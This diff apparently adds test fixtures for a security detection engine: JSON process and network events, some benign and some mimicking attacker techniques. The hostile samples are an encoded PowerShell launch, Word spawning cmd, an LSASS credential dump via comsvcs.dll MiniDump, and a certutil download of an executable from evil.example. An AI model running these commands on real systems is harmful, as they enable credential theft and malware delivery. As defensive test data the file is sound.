@@ -1,0 +1,7 @@
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -enc SQBFAFgA", "ParentImage": "C:\\Windows\\explorer.exe"}
+{"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c whoami", "ParentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"}
+{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\t.dmp full"}
+{"DestinationPort": 3389, "SourceIp": "203.0.113.9"}
+{"DestinationPort": 3389, "SourceIp": "10.1.2.3"}
+{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://evil.example/a.exe a.exe"}
+{"Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe notes.txt"}
